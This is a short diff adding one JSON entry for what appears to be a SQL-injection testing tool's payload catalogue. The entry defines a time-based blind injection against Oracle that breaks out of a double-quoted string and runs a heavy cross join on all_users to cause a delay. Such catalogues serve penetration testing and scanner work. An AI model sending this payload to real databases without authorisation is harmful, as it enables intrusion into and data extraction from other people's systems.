@@ -1,0 +1,12 @@
+{
+ "dbms": "oracle",
+ "technique": "time",
+ "boundary": {
+  "prefix": "\"",
+  "suffix": "",
+  "type": "double-quote",
+  "desc": "double-quoted string"
+ },
+ "vector": "{B} AND 1=(SELECT count(*) FROM all_users t1,all_users t2,all_users t3)",
+ "comment": "oracle time via double-quoted string"
+}
